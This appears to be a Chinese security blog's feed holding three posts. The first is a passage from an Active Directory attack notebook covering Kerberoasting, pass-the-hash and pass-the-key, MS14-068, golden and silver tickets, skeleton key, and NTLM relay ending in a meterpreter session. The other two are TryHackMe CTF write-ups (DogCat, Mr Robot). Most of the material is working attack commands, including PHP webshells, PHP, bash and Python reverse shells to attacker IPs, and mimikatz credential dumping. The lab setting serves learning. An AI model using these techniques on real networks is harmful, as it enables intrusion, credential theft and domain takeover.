14:52:35 (本地)        结束时间:   8/6/2020 14:54:35 (本地)        续订时间: 8/6/2020 14:54:35 (本地)        会话密钥类型: AES-256-CTS-HMAC-SHA1-96</code></pre><p>当然如果是RC4加密，可以使用mimikatz导出票据，离线爆破</p><pre><code>kerberos::list /export</code></pre><p>导出后，使用脚本字典来爆破票据</p><pre><code>./tgsrepcrack.py wordlist.txt xxx-MYDOMAIN.LOCAL.kirbi</code></pre><p>如果mimikatz不好使用，还可以使用powershell脚本导出hashcat格式的字符串，离线爆破</p><p>需要使用<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p><p>来导出可以直接爆破的字符串</p><pre><code>Import-Module .\Invoke-Kerberoast.ps1Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</code></pre><p>然后再使用hashcat来执行</p><pre><code>hashcat64.exe -m 13100 hash.txt pass.txt</code></pre><h3 id="Bruteforcing"><a href="#Bruteforcing" class="headerlink" title="Bruteforcing"></a>Bruteforcing</h3><p>暴力破解枚举账号和密码，可以执行的操作有</p><ul><li>枚举有效的用户名</li><li>枚举用户名和密码</li><li>查找没有启动预先身份验证的用户</li></ul><p>利用项目：<a href="https://github.com/TarlogicSecurity/kerbrute" target="_blank" rel="noopener">https://github.com/TarlogicSecurity/kerbrute</a></p><pre><code>./kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com</code></pre><p>要注意账号密码失败次数和账号策略。</p><h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>这种形式类似于PTH，只不过在打过补丁<strong>KB2871997</strong>后，PTH就只限制在Administrator下。但是这种时候还是可以使用aeskey来执行横向移动。</p><p>获取账号的aeskey</p><pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></pre><p>获取到结果一部分，由于用户是明文保存密码，以下表示的是session0中的一个Windows服务:</p><pre><code>         * Username : web$         * Domain   : DE1AY.COM         * Key List :           aes256_hmac       8d7822f543e35904f6e28a0d6f270c3b7902de70296d669354157dd33813392e           aes128_hmac       80a6938c9463a8e5195a5874966ac229           rc4_hmac_nt       0a147850da3b3c41b055628a202d2b4a           rc4_hmac_old      0a147850da3b3c41b055628a202d2b4a           rc4_md4           0a147850da3b3c41b055628a202d2b4a           rc4_hmac_nt_exp   0a147850da3b3c41b055628a202d2b4a           rc4_hmac_old_exp  0a147850da3b3c41b055628a202d2b4a</code></pre><p>然后再执行注入aeskey</p><pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:web$ /domain:DE1AY.COM /aes256:8d7822f543e35904f6e28a0d6f270c3b7902de70296d669354157dd33813392e&quot;</code></pre><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>哈希传递攻击，就是不需要明文登录，用NTLM hash可直接进行登录。攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务。先查看是否有补丁<code>kb2871997</code></p><p>使用mimikatz先获取hash:</p><pre><code>privilege::debugsekurlsa::logonpasswords</code></pre><p>获取到信息部分显示如下</p><pre><code>Session           : Interactive from 1User Name         : de1ayDomain              : DE1AYLogon Server      : DCLogon Time        : 2020/8/7 16:20:47SID               : S-1-5-21-2756371121-2868759905-3853650604-1001    msv :          [00000003] Primary          * Username : de1ay    * Domain   : DE1AY    * LM       : f67ce55ac831223dc187b8085fe1d9df    * NTLM     : 161cff084477fe596a5db81874498a24    * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</code></pre><p>获取到hash后执行PTH，再访问远程主机即可直接利用此账号密码访问。</p><pre><code>sekurlsa::pth /user:de1ay /domain:DE1AY /ntlm:161cff084477fe596a5db81874498a24</code></pre><p>获取到的hash也可以直接进行暴力破解，比如利用hashcat执行</p><pre><code>hashcat -m 1000 161cff084477fe596a5db81874498a24 password.dict -o out.txt —force</code></pre><p>利用crackmapexec进行批量pass the hash</p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></p><pre><code>crackmapexec 192.168.120.0/24 -u de1ay -H 161cff084477fe596a5db81874498a24</code></pre><h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>票据传递攻击，使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。</p><h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>该漏洞允许用户提升任意普通用户权限成为域管理员（Domain Admin）身份，对应的补丁是kb3011780</p><p>需要一个域用户权限和本地机器账号权限。首先是使用域用户权限获取域用户的SID</p><pre><code>whoami /all用户名      SID=========== ==============================================de1ay\de1ay S-1-5-21-2756371121-2868759905-3853650604-1001</code></pre><p>利用漏洞执行脚本来生成一个票据缓存，<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre><code>C:\bea&gt;MS14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604-1001 -d dc.de1ay.com -p 1qaz@WSX  [+] Building AS-REQ for dc.de1ay.com... Done!  [+] Sending AS-REQ to dc.de1ay.com... Done!  [+] Receiving AS-REP from dc.de1ay.com... Done!  [+] Parsing AS-REP from dc.de1ay.com... Done!  [+] Building TGS-REQ for dc.de1ay.com... Done!  [+] Sending TGS-REQ to dc.de1ay.com... Done!  [+] Receiving TGS-REP from dc.de1ay.com... Done!  [+] Parsing TGS-REP from dc.de1ay.com... Done!  [+] Creating ccache file &#39;TGT_de1ay@de1ay.com.ccache&#39;... Done!</code></pre><p>生成一个<a href="mailto:`TGT_de1ay@de1ay.com.ccache" target="_blank" rel="noopener">`TGT_de1ay@de1ay.com.ccache</a>`票据文件，利用mimikatz注入内存，先清除含有的票据，以免导致写入失败</p><pre><code>kerberos::list kerberos::purge   //清除kerberos::ptc TGT_de1ay@de1ay.com.ccache</code></pre><p>如果显示<code>Injecting ticket : OK</code>表示成功。</p><pre><code>使用kerberos::list 就可以看到注入的票据。</code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>黄金票据就是自己生成的TGT，在生成TGT的过程中，用户、域、权限等信息会经过krbtgt账户hash的加密，所以获取到用户、域、SID、krbtgt的hash值就可以生成黄金票据，生成的票据就是域管账号也就是可以控制整个域。</p><p>krbtgt账户一般只在域控服务器上，所以一般需要一个域控器权限。先导出krbtgt用户hash。</p><pre><code>privilege::debuglsadump::lsa /patch       #获取用户hash和域sid</code></pre><p>获取hash后，利用mimikatz伪造用户，例如伪造域管理员administrator。</p><pre><code>kerberos::golden /domain:de1ay.com /sid:sid /krbtgt:hash /user:administrator /ticket:admin.kirbi</code></pre><p>再利用mimikatz导入票据</p><pre><code>mimikatz::ptt admin.kirbi</code></pre><p>可以使用klist查看票据导入是否成功</p><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>白银票据伪造利用的是Kerberos认证中的第三个步骤，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了。</p><p>还是需要域控制器的权限，在域控制器下执行</p><pre><code>privilege::debugsekurlsa::logonpasswords</code></pre><p>获得其中的域sid和NTLM hash。利用mimikatz生成</p><pre><code>kerberos::golden /domain:de1ay.com /sid:S-1-5-21-1218902331-2157346161-1782232778  /target:192.168.3.21 /rc4:8432d4fa4430ecf56927dbabd1b4d36b /service:cifs /user:de1ay /ptt</code></pre><p>如上生成的cifs服务的票据，可以访问域控制器的文件共享系统。</p><h4 id="skeleton-key"><a href="#skeleton-key" class="headerlink" title="skeleton key"></a>skeleton key</h4><p>skeleton key（万能钥匙）就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对lsass.exe 进行注入，所以重启后会失效。</p><p>首先在域控中安装skeleton key，所以以下在域控中执行</p><pre><code>privilege::debugmisc::skeleton</code></pre><p>获得一堆OK，然后直接使用命令去访问，生成的密码是mimikatz。</p><pre><code>net use \\dc.de1ay.com mimikatz /user:web\de1ay.com</code></pre><p>由于微软增加了lsass的防注入LSA Protection，所以以上适用于系统</p><pre><code>Windows 8.1Windows Server 2012 R2</code></pre><p>后来mimikatz也支持了绕过的形式，配合mimidrv.sys</p><pre><code>privilege::debug!+!processprotect /process:lsass.exe /removemisc::skeleton</code></pre><p>此形式并非特权提升，只能算是增加一个新的万能密码。</p><h3 id="Relay-Hash"><a href="#Relay-Hash" class="headerlink" title="Relay Hash"></a>Relay Hash</h3><p>目标机器不能开启smb签名，否则利用无效,一般情况下，windows server会默认开启，而windows单机系统默认都不会开。</p><h4 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h4><p>利用脚本<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></p><p>首先执行，要在特权模式下执行，否则会无法监听</p><pre><code>Import-Module .\Inveigh.psd1Invoke-Inveigh -consoleoutput Y</code></pre><p>当其他主机来连接的时候，终端会显示出主机的NTLM hash</p><pre><code>[+] [2020-08-11T16:14:30] SMB(445) NTLM challenge 123B1B44BE03722D sent to 10.10.10.201:65312[+] [2020-08-11T16:14:30] SMB(445) NTLMv2 captured for DE1AY\de1ay from 10.10.10.201(PC):65312:de1ay::DE1AY::1812B95C562D1DA8C8D033B9F3C259A5:010100000000000096643A70B76FD601D1A5312DF1DFFF35000000310041005900010004004400430004001200640065003100610079002E0063006F006D0003001800440043002E0064006500306F006D0005001200640065003100610079002E0063006F006D000700080096643A70B76FD601060004000200000008003000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000900200063006900660073002F00310030002E00310030002E00310030002E0031003000000000000000000000000000[+] [2020-08-11T16:14:31] NBNS request for TCONF.F.360.CN&lt;00&gt; received from 10.10.10.201[spoofer dis</code></pre><p>如果需要利用hash，可以使用<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><pre><code>Import-Module .\Invoke-TheHash.ps1Invoke-WMIExec -Target 192.168.30.152 -Domain de1ay.com -Username de1ay -Hash 1812B95C562D1DA8C8D033B9F3C259A5 -Command &quot;whoami&quot; -verbose</code></pre><h4 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h4><p>使用impacket中的smbrelayx.py文件来做中继攻击。</p><pre><code>python smbrelayx.py -h 192.168.120.140   #IP为想要获取权限的主机地址</code></pre><p>如果有主机访问执行中继的地址，比如192.168.120.130</p><pre><code>net use \\192.168.120.130\c$ /user:&quot;DE1AY\de1ay&quot; &quot;1qaz@WSX&quot;</code></pre><p>如果抓取成功，可以看到如下内容</p><pre><code>[*] SMBD: Received connection from 192.168.120.142, attacking target 192.168.120.140[*] Authenticating against 192.168.120.140 as DE1AY\de1ay SUCCEED[*] de1ay::DE1AY:b937bb0942684e01:15bf5db54f019b8f52141375eeea221e:0101000000000000738d1ab3bd6fd60180e5339dcce53e660000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800738d1ab3bd6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000[*] Sending status code STATUS_SUCCESS after authentication to 192.168.120.142[-] TreeConnectAndX not found C$</code></pre><p>如果权限足够，可以dump下来192.168.120.140主机上的hash。借助hash来执行命令</p><pre><code>python smbrelayx.py -h 192.168.120.140 -c whoami</code></pre><p>执行后命令得到执行</p><pre><code>[*] Starting service RemoteRegistry[*] HTTPD: Received connection from 192.168.120.142, attacking target 192.168.120.140[*] Authenticating against 192.168.120.140 as DE1AY\administrator SUCCEED[*] administrator::DE1AY:0e7c6d90b614dbe7:a4061e0695772bfca50b692e5c92a1d7:0101000000000000366c24e1be6fd60110d629b8722f71300000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800366c24e1be6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280048005400540050002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000[-] 192.168.120.140 is being attacker at the moment, skipping.. [*] Executed specified command on host: 192.168.120.140nt authority\system</code></pre><h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><p>Responder通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。</p><pre><code>python Responder.py -I eth0 wrp</code></pre><p>当有执行访问smb请求时，可以抓取到</p><pre><code>[*] [LLMNR]  Poisoned answer sent to 192.168.120.142 for name wpad[HTTP] NTLMv2 Client   : 192.168.120.142[HTTP] NTLMv2 Username : DE1AY\de1ay[HTTP] NTLMv2 Hash     : de1ay::DE1AY:59e4691da47e5fe3:542D7E586900FF2E6C077ED906B08E41:0101000000000000FF2D1573BF6FD6013E50BF5D7E2EDF74000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000000000000000000000900280048005400540050002F003100390032002E003100360038002E003100320030002E003100330030000000000000000000   </code></pre><p>利用可以采用上面提到的脚本<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><h4 id="msfrelay"><a href="#msfrelay" class="headerlink" title="msfrelay"></a>msfrelay</h4><p>执行方式大致如下</p><pre><code>msf5 &gt; use exploit/windows/smb/smb_relaymsf5 exploit(windows/smb/smb_relay) &gt; show optionsModule options (exploit/windows/smb/smb_relay):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SHARE    ADMIN$           yes       The share to connect to   SMBHOST                   no        The target SMB server (leave empty for originating system)   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0   SRVPORT  445              yes       The local port to listen on.Exploit target:   Id  Name   --  ----   0   Automaticmsf5 exploit(windows/smb/smb_relay) &gt; set smbhost 192.168.120.140smbhost =&gt; 192.168.120.140msf5 exploit(windows/smb/smb_relay) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(windows/smb/smb_relay) &gt; set lhost 192.168.120.130lhost =&gt; 192.168.120.130msf5 exploit(windows/smb/smb_relay) &gt; set lport 8855lport =&gt; 8855msf5 exploit(windows/smb/smb_relay) &gt; show options Module options (exploit/windows/smb/smb_relay):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SHARE    ADMIN$           yes       The share to connect to   SMBHOST  192.168.120.140  no        The target SMB server (leave empty for originating system)   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0   SRVPORT  445              yes       The local port to listen on.Payload options (windows/meterpreter/reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)   LHOST     192.168.120.130  yes       The listen address (an interface may be specified)   LPORT     8855             yes       The listen portExploit target:   Id  Name   --  ----   0   Automaticmsf5 exploit(windows/smb/smb_relay) &gt; run[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.120.130:8855 [*] Started service listener on 0.0.0.0:445 [*] Server started.</code></pre><p>当有smb的连接过来的时候</p><pre><code>C:\Users\de1ay.DE1AY&gt;net use \\192.168.120.130\c$ /user:&quot;DE1AY\administrator&quot; &quot;1qaz@WSX&quot;</code></pre><p>就会有如下反应</p><pre><code>msf5 exploit(windows/smb/smb_relay) &gt; [*] Sending NTLMSSP NEGOTIATE to 192.168.120.140[*] Extracting NTLMSSP CHALLENGE from 192.168.120.140[*] Forwarding the NTLMSSP CHALLENGE to 192.168.120.142:53508[*] Extracting the NTLMSSP AUTH resolution from 192.168.120.142:53508, and sending Logon Failure response[*] Forwarding the NTLMSSP AUTH resolution to 192.168.120.140[+] SMB auth relay against 192.168.120.140 succeeded[*] Connecting to the defined share...[*] Regenerating the payload...[*] Uploading payload...[*] Created \QsYUxAsk.exe...[*] Connecting to the Service Control Manager...[*] Obtaining a service manager handle...[*] Creating a new service...[*] Closing service handle...[*] Opening service...[*] Starting the service...[*] Removing the service...[*] Closing service handle...[*] Deleting \QsYUxAsk.exe...[*] Sending stage (180291 bytes) to 192.168.120.140</code></pre><p>查看session，可以发现已经有一个建立的session</p><pre><code>msf5 exploit(windows/smb/smb_relay) &gt; sessionsActive sessions===============  Id  Name  Type                     Information                Connection  --  ----  ----                     -----------                ----------  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WEB  192.168.120.130:8855 -&gt; 192.168.120.140:54330 (192.168.120.140)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在进行这些东西之前，至少需要一个可完整交互的shell，默认就已经获得了shell，并且提权到&lt;code&gt;nt authority\system&lt;/code&gt; &lt;/p&gt;
&lt;h3 id=&quot;AS-REP-Roasting&quot;&gt;&lt;a href=&quot;#AS-REP-Roasting&quot; 
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe DogCat</title>
    <link href="/2020/07/TryHackMe-DogCat/"/>
    <id>/2020/07/TryHackMe-DogCat/</id>
    <published>2020-07-28T08:57:08.000Z</published>
    <updated>2020-07-28T08:57:08.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dogcat"><a href="#dogcat" class="headerlink" title="dogcat"></a>dogcat</h2><p>来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功能。</p><pre><code>http://10.10.175.143/?view=dog</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140132214.png" alt="image-20200724140132214"></p><p>给参数来个单引号查看变化，发现报错，并且从报错上看，明显是文件读取拼接文件后缀名，所以此处可能存在一个文件读取漏洞。</p><pre><code>http://10.10.175.143/?view=dog%27</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140621351.png" alt="image-20200724140621351"></p><p>再尝试添加一个%00来截断后缀，发现没有后缀显示，应该是已经截断。</p><pre><code>http://10.10.175.143/?view=dog%27%00</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140728518.png" alt="image-20200724140728518"></p><p>尝试读取本地文件的时候发现只能读取dog和cat的文件，猜测可能是由于判断请求中是否含有相关字段</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724141429734.png" alt="image-20200724141429734"></p><p>再%00后面添加dog字段发现可以绕过，说明是判断是否存在字符串，只不过发现读取文件的时候并不能正常读取。include_path在任何文件中都可以直接引入该目录下文件，被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724142635527.png" alt="image-20200724142635527"></p><p>绕了一圈发现是错误是文件读取上的错误，不能识别文件，说明截断失败，再关注一下php版本发现是7系统，php已经修复%00的文件截断。所以需要一个不截断正常去读取的操作，没有在意php版本导致绕一圈。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724152733228.png" alt="image-20200724152733228"></p><p>调用的时候发现一个报错是多次调用导致重复声明，说明index包含很可能是成功的。</p><p>利用php协议来读取文件，尝试php://filter，可以读取到文件内容</p><pre><code>/?view=php://filter/read=convert.base64-encode/resource=dog/../index</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153220725.png" alt="image-20200724153220725"></p><p>解码后index的内容为</p><pre><code>&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;dogcat&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;dogcat&lt;/h1&gt;    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;    &lt;div&gt;        &lt;h2&gt;What would you like to see?&lt;/h2&gt;        &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;        &lt;?php            function containsStr($str, $substr) {                return strpos($str, $substr) !== false;            }        $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;            if(isset($_GET[&#39;view&#39;])) {                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {                    echo &#39;Here you go!&#39;;                    include $_GET[&#39;view&#39;] . $ext;                } else {                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;                }            }        ?&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>存在一个参数ext是获取后缀的，判断是否存在后缀，存在的话拼接参数后缀，构造一个文件读取为地址，也可以ext置为空。</p><pre><code>/?view=/dog/../etc/&amp;ext=passwd/?view=/dog/../etc/passwd&amp;ext=</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153512101.png" alt="image-20200724153512101"></p><p>然后现在需要考虑的就是如果把本地文件读取来获取rce。</p><p>想试一下从<code>/proc/self/environ</code>来获取，发现文件没有权限，尝试别的目录，发现可以读取日志。</p><pre><code>/?view=/dog/../var/log/apache2/access.log&amp;ext=&amp;aaa=&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724155056684.png" alt="image-20200724155056684"></p><p>由于使用bp的时候编码和特殊符号会导致写入错误，所以使用curl写一句话</p><pre><code>curl -v &quot;http://10.10.136.89/&lt;?php system($_GET\[&#39;cmd&#39;\]);?&gt;&quot;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724173648127.png" alt="image-20200724173648127"></p><p>反弹一个shell回来</p><pre><code>php+-r+&#39;$sock=fsockopen(&quot;10.6.xx.xx&quot;,8877);exec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;);&#39;</code></pre><p>获取权限后，查看一下sudo权限，env命令可以显示当前用户的环境变量</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727153957529.png" alt="image-20200727153957529"></p><p>利用<code>sudo env /bin/bash</code>获取一个root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727154232251.png" alt="image-20200727154232251"></p><p>搜了一圈发现只有三个flag，flag4并不在，查了一下根目录发现<code>.dockerenv</code>，这是个docker环境，所以可能需要docker逃逸一下？</p><p>先升级一个可交互的shell来操作，docker不带python环境和socat，所以先传一个socat上去。主机不带wget，使用curl</p><pre><code>curl -o socat http://10.6.xx.xx:8000/socat</code></pre><p>再docker上执行</p><pre><code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.6.xx.xx:4444</code></pre><p>在自己监听主机上执行</p><pre><code>./socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727155322648.png" alt="image-20200727155322648"></p><p>再试一手CVE-2016-5195，<a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></p><p>发现还是不行，查看一下系统上有没有可以利用的文件</p><p>在<code>/opt/</code>下找到一个backups目录，里面有一个备份的sh脚本。执行的是/root/container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell</p><pre><code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.6.xx.xx/8855 0&gt;&amp;1&quot; &gt; /opt/backups/backup.sh</code></pre><p>里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;dogcat&quot;&gt;&lt;a href=&quot;#dogcat&quot; class=&quot;headerlink&quot; title=&quot;dogcat&quot;&gt;&lt;/a&gt;dogcat&lt;/h2&gt;&lt;p&gt;来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TryHackMe Mr Robot</title>
    <link href="/2020/07/TryHackMe-Mr-Robot/"/>
    <id>/2020/07/TryHackMe-Mr-Robot/</id>
    <published>2020-07-28T08:56:29.000Z</published>
    <updated>2020-07-28T08:56:29.554Z</updated>
    
    <content type="html"><![CDATA[<p>来自tryhackme的Mr Robot CTF</p><p>访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。</p><pre><code>http://10.10.188.224/http:/10.10.188.224/</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728135544303.png" alt="image-20200728135544303"></p><p>然后查找一个其他页面是否有别的信息。</p><pre><code>python dirbrute.py http://10.10.188.224/ -t 20 -d ./dics/DirBuster/directory-list-2.3-medium.txt</code></pre><p>查找到部分信息</p><pre><code>http://10.10.188.224/sitemaphttp://10.10.188.224/rsshttp://10.10.188.224/loginhttp://10.10.188.224/feedhttp://10.10.188.224/0http://10.10.188.224/atomhttp://10.10.188.224/imagehttp://10.10.188.224/wp-contenthttp://10.10.188.224/adminhttp://10.10.188.224/introhttp://10.10.188.224/wp-loginhttp://10.10.188.224/rss2http://10.10.188.224/licensehttp://10.10.188.224/Imagehttp://10.10.188.224/rdfhttp://10.10.188.224/page1http://10.10.188.224/readmehttp://10.10.188.224/robots......</code></pre><p>其中robots文件中提示我们有两个文件</p><pre><code>fsocity.dickey-1-of-3.txt</code></pre><p>其中<code>key-1-of-3.txt</code>就是我们需要的第一个key。另一个文件看起来像是个字典，可能是需要爆破后面的登陆账号密码，现在需要一个账号。先用这个字典爆破一个账号，在密码找回的地方，找到一个<code>Elliot</code>用户。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728151142975.png" alt="image-20200728151142975"></p><p>然后再去爆破密码，原字典里发现有不少重复的单词，去重后发现数量少了一大半，就这是用来消耗你时间的啊？</p><p>使用在线去重：<a href="https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为" target="_blank" rel="noopener">https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为</a></p><p><code>ER28-0652</code>，登陆后台。</p><p>同过后台上传插件，上传一个php文件，虽然会显示上传失败，但是文件已经上传</p><pre><code>http://10.10.188.224/wp-content/uploads/2020/07/1.php</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162306251.png" alt="image-20200728162306251"></p><p>上传的是一句话，使用蚁剑连接即可。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162409252.png" alt="image-20200728162409252"></p><p>为了方便操作命令，反弹一个shell回来。</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.6.4.191\&quot;,8089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;</code></pre><p>反弹回来后，利用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>来升级shell模式。</p><p>在<code>/home/robot</code>目录下发现一个文件，其中包含的<code>robot:c3fcd3d76192e4007dfb496cca67e13b</code>解密是<code>abcdefghijklmnopqrstuvwxyz</code>，用户robot的密码可能就是这个。</p><p>更改到这个用户后，目录下就有我们需要的第二个key。</p><p>然后使用此用户提权，先查看一个SUID文件，<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>结果中看到这个文件，nmap在版本低于5.21的时候，可以提权</p><pre><code>/usr/local/bin/nmap  nmap version 3.81</code></pre><p>利用nmap提权获取root：</p><pre><code>robot@linux:~$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!sh# ididuid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)#</code></pre><p>在root目录下就可以看到<code>firstboot_done</code>文件和最后一个key，到此就算是结束了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来自tryhackme的Mr Robot CTF&lt;/p&gt;
